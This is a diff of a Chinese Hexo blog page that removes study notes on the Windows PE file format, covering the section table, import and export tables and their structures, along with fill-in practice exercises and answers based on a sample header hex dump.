-<p>节表，每个节表保存了该节的长度、在文件和内存中的开始地址、节名、节属性（RWX属性等）</p>
-<ul>
-<li>节名：8字节</li>
-<li>Virtual Size：4字节，实际长度</li>
-<li>RVA：该节的RVA</li>
-<li>Size of Raw Data：文件中该节所占的大小</li>
-<li>Pointer to Raw Data：文件中该节的起始地址</li>
-<li>Characteristics：节属性，由几个比特异或得到
-<ul>
-<li>bit 5：表明这个节中是否存放代码</li>
-<li>bit 6：表明这个节中是否为已初始化数据</li>
-<li>bit 7：表明这个节中是否为未初始化数据（bss段）</li>
-<li>bit 9：表明这个节中是否包含注释或其他信息</li>
-<li>bit 11：表明这个节中的内容是否应该被放入最终的exe文件中</li>
-<li>bit 25：表明这个块是否可以丢弃（通常为重定位节.reloc）</li>
-<li>bit 28：表明这个块是否可以共享</li>
-<li>bit 29：表明这个块是否可执行</li>
-<li>bit 30：表明这个块是否可读</li>
-<li>bit 31：表明这个块是否可写</li>
-</ul>
-</li>
-</ul>
-<p><strong>5. Sections</strong></p>
-<ul>
-<li>.text / CODE：代码节，保存全部代码。每个PE文件均存在</li>
-<li>.data / DATA：数据节，保存已初始化数据（编译时已经确定的数据）</li>
-<li>.bbs：数据节，保存未初始化数据（未初始化的全局和静态变量）</li>
-<li>.rdata：引入函数节，保留引入函数的信息（函数名及所属dll文件名等）这些函数位于一个或多个dll文件中。
-<ul>
-<li><strong>Import Address Table (IAT)</strong>：一系列<strong>Image_Thunk_Data</strong>结构数组（4字节），每一个结构都定义了一个指向导入函数的Hint和名字的指针或Hint或其他值，而导入函数的Hint和名字实际保存于Import Hints/Names &amp; DLL Names中。<strong>在磁盘文件中，IAT与INT保存的内容相同；在内存中，这里保存所有引入函数在内存中的地址。</strong>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">IMAGE_THUNK_DATA STRUCT</span><br><span class="line">	union u1</span><br><span class="line">		ForwarderString DWORD ?		; 转向者RVA</span><br><span class="line">		Function DWORD ?			; 被引入的函数的内存地址(IAT表)</span><br><span class="line">		Ordinal DWORD ?				; 被引入API的函数序号(INT表)</span><br><span class="line">		AddressOfData DWORD ?		; 被引入API的hint/name RVA(INT表)</span><br><span class="line">	ends</span><br><span class="line">IMAGE_THUNK_DATA ENDS</span><br></pre></td></tr></table></figure>
-</li>
-<li><strong>Import Directory Table (IDT)</strong>：引入目录表，其地址存放在NT HEADER可选头的第二个属性之中便于获取，由<strong>IMAGE_IMPORT_DESCRIPTOR</strong>结构体（长度20字节）数组组成，其数量取决于使用的DLL文件的数量，每一个结构对应一个DLL文件。所有DLL结构体后有一个全0的结构体用于表示这部分结束。  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">IMAGE_IMPORT_DESCRIPTOR STRUCT</span><br><span class="line">	union</span><br><span class="line">		Characteristics dd ?</span><br><span class="line">		OriginalFirstThunk dd ?	; 指向INT中对应DLL的RVA</span><br><span class="line">	Ends</span><br><span class="line">	TimeDateStamp dd ?</span><br><span class="line">	ForwarderChain dd ?</span><br><span class="line">	Name1 dd ?			; 指向dll文件名字符串的RVA</span><br><span class="line">	FirstThunk dd ?		; 指向IAT中对应DLL的RVA</span><br><span class="line">IMAGE_IMPORT_DESCRIPTOR ENDS</span><br></pre></td></tr></table></figure>
-<strong>OriginalFirstThunk</strong>是指向Import Name(lookup) Table中的指针<br />
-<strong>FirstThunk</strong>是指向Import Address Table中的指针</li>
-<li><strong>Import Name table</strong>：一系列<strong>Image_Thunk_Data</strong>结构数组，在Import Name Table中，data最高位为0时表示通过函数名引入，为1表示通过序号引入。不同DLL文件的结构体之间通过一个全0的DWORD分隔。</li>
-<li><strong>Import Hints/Names &amp; DLL Names</strong>：保存每个函数的Hint和名字，Hint为2字节，名字紧跟在Hint之后。一个DLL文件的所有引入函数列举完毕后在后面附上DLL的名字，下一个DLL文件的函数信息写在后面，需要4字节对齐。</li>
-</ul>
-</li>
-<li>.edata：导出函数节，本文件向其他程序提供调用函数的列表、函数所在地址和具体代码实现，多见于DLL文件。
-<ul>
-<li><strong>Image Export Directory</strong>：导出目录表，其起始地址保存在NT HEADER可选头的第一个属性之中便于获取  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">IMAGE_EXPORT_DIRECTORY STRUCT</span><br><span class="line">&#123;</span><br><span class="line">	DWORD Characteristics</span><br><span class="line">	DWORD TimeDateStamp			; 文件生成时间</span><br><span class="line">	WORD MajorVersion</span><br><span class="line">	WORD MinorVersion</span><br><span class="line">	DWORD Name					; 指向DLL的名字（RVA）</span><br><span class="line">	DWORD Base					; ExportAddress开始序号，一般为1</span><br><span class="line">	DWORD NumberOfFunctions		; 函数的数量</span><br><span class="line">	DWORD NumberOfNames</span><br><span class="line">	DWORD AddressOfFunctions	; Address Table RVA, 函数地址数组</span><br><span class="line">	DWORD AddressOfNames		; Name Pointer RVA, 函数名所在地址数组</span><br><span class="line">	DWORD AddressOfNameOrdinals	; Ordinal RVA, 函数索引序列号数组</span><br><span class="line">&#125;;IMAGE_EXPORT_DIRECTORY ENDS</span><br></pre></td></tr></table></figure>
-</li>
-<li>Export Address Table：导出地址表，多用于保存导出函数地址  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Typedef <span class="class"><span class="keyword">struct</span> _<span class="title">image_Export_address_Table</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">union</span>&#123;</span></span><br><span class="line">		DWORD dwExportRVA;		<span class="comment">// 指向导出地址</span></span><br><span class="line">		DWORD dwForwarderRVA;	<span class="comment">// 指向另外DLL中某个API函数名</span></span><br><span class="line">	&#125;;</span><br><span class="line">&#125;IMAGE_Export_Address_Table, *pIMAGE_Export_Address_Table</span><br></pre></td></tr></table></figure>
-</li>
-<li>Export Name Pointer Table：导出名字指针表，保存导出函数名字字符串的地址  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Typedef <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_Export_Name_Pointer_Table_</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	DWORD dwPointer;</span><br><span class="line">&#125;IMAGE_Export_Name_Pointer_Table;</span><br></pre></td></tr></table></figure>
-</li>
-<li>Export Ordinal Table：导出符号表，保存导出函数的编号。  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Typedef <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_Export_Ordinal_Table_</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	DWORD dwOrdinal;</span><br><span class="line">&#125;_IMAGE_Export_Ordinal_Table_;</span><br></pre></td></tr></table></figure>
-<strong>注意</strong>：由于代码段中可能存在无名函数、重载函数等，因此导出函数的编号与导出函数名可能并不是一一对应，因此需要导出函数编号为每一个函数进行编号，唯一确定一个函数。<br />
-<font color=red>根据导出函数表定位函数内存地址的方法：</font>
-<ul>
-<li>从AddressOfNames中获取到需要定位的函数的名字（记下函数名的索引）</li>
-<li>从AddressOfNameOrdinals中获取到该函数的编号（以索引定位）</li>
-<li>从AddressOfFunctions中获取该编号对应函数的地址（编号值就是数组索引值）</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>.rsrc：资源节，存放图标、对话框等程序需要用到的资源。<strong>树形结构</strong>，有一个主目录，下有嵌套子目录或数据。Windows通常有3层目录(资源类型、资源标识符、资源语言)，第4层是具体的资源。具体结构不做要求。</li>
-<li>.reloc：重定位节，存放了一个重定位表。若装载器不是把程序装到程序编译时默认的基地址时，就需要这个重定位表来做一些调整。</li>
-</ul>
-<p><strong>练习题</strong><br />
-由于本章内容多为记忆内容，这里只给出少数需要计算的例题供参考。<br />
-<strong>1.</strong> 一个exe文件的Image Base=0x400000，Address of Entry Point=0x1000，那么该程序的第一条指令在内存中的地址为________。<br />
-<strong>2.</strong> 在导入名称表（INT）中有一个指针的值为0x20A4，这个指针在________（填“内存”或“磁盘”）中的有效，已知IAT的Raw Data Address=0x800，RVA=0x1800，则0x20A4指向的内存地址在磁盘中的原像为________。<br />
-<strong>3.</strong> exe文件本身也属于文件，要想找到一个exe文件的某个导入函数的内存地址，首先应该在exe文件中找到可选头中存放的_______________，通过这个来定位到_________的地址，在这里可以通过遍历所有结构的________________字段来获取到这个函数的索引，接着在_____________________中找到这个索引下的地址值，即为目标函数在内存中的地址。<br />
-<strong>4.</strong> 下面是一个PE文件的头部数据，据此回答下列问题：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">0x000 4D 5A 90 00 03 00 00 00 04 00 00 00 FF FF 00 00</span><br><span class="line">0x010 B8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00</span><br><span class="line">0x020 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">0x030 00 00 00 00 00 00 00 00 00 00 00 00 00 01 00 00</span><br><span class="line">0x040 0E 1F BA 0E 00 B4 09 CD 21 B8 01 4C CD 21 54 68</span><br><span class="line">0x050 69 73 20 70 72 6F 67 72 61 6D 20 63 61 6E 6E 6F</span><br><span class="line">0x060 74 20 62 65 20 72 75 6E 20 69 6E 20 44 4F 53 20</span><br><span class="line">0x070 6D 6F 64 65 2E 0D 0D 0A 24 00 00 00 00 00 00 00</span><br><span class="line">0x080 9F 32 0F AA DB 53 61 F9 DB 53 61 F9 DB 53 61 F9</span><br><span class="line">0x090 D2 2B F2 F9 D7 53 61 F9 CF 38 60 F8 D3 53 61 F9</span><br><span class="line">0x0A0 B7 27 65 F8 D6 53 61 F9 B7 27 62 F8 DF 53 61 F9 </span><br><span class="line">0x0B0 B7 27 64 F8 FB 53 61 F9 DB 53 60 F9 FF 52 61 F9 </span><br><span class="line">0x0C0 B7 27 60 F8 DC 53 61 F9 0D 27 64 F8 DF 53 61 F9 </span><br><span class="line">0x0D0 0D 27 65 F8 DA 53 61 F9 0D 27 9E F9 DA 53 61 F9 </span><br><span class="line">0x0E0 DB 53 F6 F9 DA 53 61 F9 0D 27 63 F8 DA 53 61 F9 </span><br><span class="line">0x0F0 52 69 63 68 DB 53 61 F9 00 00 00 00 00 00 00 00 </span><br><span class="line">0x100 50 45 00 00 4C 01 05 00 9B C0 42 62 00 00 00 00 </span><br><span class="line">0x110 00 00 00 00 E0 00 02 01 0B 01 0E 1C 00 8C 00 00 </span><br><span class="line">0x120 00 98 00 00 00 00 00 00 A2 80 00 00 00 10 00 00 </span><br><span class="line">0x130 00 A0 00 00 00 00 40 00 00 10 00 00 00 02 00 00 </span><br><span class="line">0x140 06 00 00 00 00 00 00 00 06 00 00 00 00 00 00 00 </span><br><span class="line">0x150 00 60 01 00 00 04 00 00 00 00 00 00 02 00 40 81 </span><br><span class="line">0x160 00 00 10 00 00 10 00 00 00 00 10 00 00 10 00 00 </span><br><span class="line">0x170 00 00 00 00 10 00 00 00 00 00 00 00 00 00 00 00 </span><br><span class="line">0x180 70 ED 00 00 18 01 00 00 00 20 01 00 B8 13 00 00 </span><br><span class="line">0x190 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 </span><br><span class="line">0x1A0 00 40 01 00 50 13 00 00 CC DD 00 00 54 00 00 00 </span><br><span class="line">0x1B0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 </span><br><span class="line">0x1C0 08 DF 00 00 18 00 00 00 20 DE 00 00 40 00 00 00 </span><br><span class="line">0x1D0 00 00 00 00 00 00 00 00 00 A0 00 00 C4 04 00 00 </span><br><span class="line">0x1E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 </span><br><span class="line">0x1F0 00 00 00 00 00 00 00 00 2E 74 65 78 74 00 00 00 </span><br></pre></td></tr></table></figure>
-<p>(1) 最开头两个字节表示的字符是_______，这是PE文件的____________结构。（4分）<br />
-(2) NT HEADER的起始地址为_______，你是通过__________（填16进制地址）的值得到的。（4分）<br />
-(3) PE文件头的标志在_______（填16进制地址）处，代表的字符为________。（4分）<br />
-(4) 这个PE文件有______个节，通过______（填16进制地址）处的值可以知道。（4分）<br />
-(5) 这个PE文件的Image Base为___________，通过______（填16进制地址）处的值可以知道。（4分）<br />
-(6) 这个PE文件的Address of Entry Point为___________，通过______（填16进制地址）处的值可以知道。（4分）<br />
-(7) 导入表的RVA是__________，通过______（填16进制地址）处的值可以知道。（4分）<br />
-<strong>5.</strong> 阅读某PE文件中.rdata节的IMAGE_SECTION_HEADER，回答下列问题：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">IMAGE_SECTION_HEADER .rdata</span><br><span class="line">0x220 2E 72 64 61 74 61 00 00 A2 5C 00 00 00 A0 00 00 </span><br><span class="line">0x230 00 5E 00 00 00 90 00 00 00 00 00 00 00 00 00 00 </span><br><span class="line">0x240 00 00 00 00 40 00 00 40</span><br></pre></td></tr></table></figure>
-<p>已知该PE文件的Image Base=0x400000，导入表的RVA=0xED70<br />
-(1) .rdata节的RVA=<em><strong><strong><strong><strong>，通过</strong></strong></strong>（填16进制地址）处的值可以知道。（4分）<br />
-(2) .rdata节在磁盘中的文件偏移为</strong></em>______，通过______（填16进制地址）处的值可以知道。（4分）<br />
-(3) 导入表在磁盘中的文件偏移应为_________。（3分）</p>
-<p>答案：</p>
-<ol>
-<li>
-<p>0x401000</p>
-</li>
-<li>
-<p>内存；0x10A4</p>
-</li>
-<li>
-<p>IDT的RVA；IDT；OriginalFirstThunk；IAT</p>
-</li>
-<li>
-<p>(1) MZ；DOS头<br />
-(2) 0x100；0x3C<br />
-(3) 0x100；PE<br />
-(4) 5；0x106<br />
-(5) 0x400000；0x134<br />
-(6) 0x80A2；0x128<br />
-(7) 0xED70；0x180</p>
-</li>
-<li>
-<p>(1) 0xA000；0x22C<br />
-(2) 0x9000；0x234<br />
-(3) 0xDD70（.rdata节的VA=0x400000+0xA000=0x40A000，IDT的VA-IDT的磁盘偏移=.rdata的VA-.rdata的磁盘偏移，故IDT的磁盘偏移=IDT的VA-(0x40A000-0x900)=0x400000+0xED70-0x401000=0xDD70）</p>
-</li>
-</ol>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -2837,7 +2709,7 @@ PE文件主要包括：.exe，.dll，.sys等，.dll是动态加载库，不能�
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">131</span>
+          <span class="site-state-item-count">132</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -2895,7 +2767,7 @@ PE文件主要包括：.exe，.dll，.sys等，.dll是动态加载库，不能�
       <i class="fa fa-coffee"></i>
     </span>
       <span class="post-meta-item-text">Reading time total &asymp;</span>
-    <span title="Reading time total">17:09</span>
+    <span title="Reading time total">17:14</span>
 </div>
   <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a>
   </div>
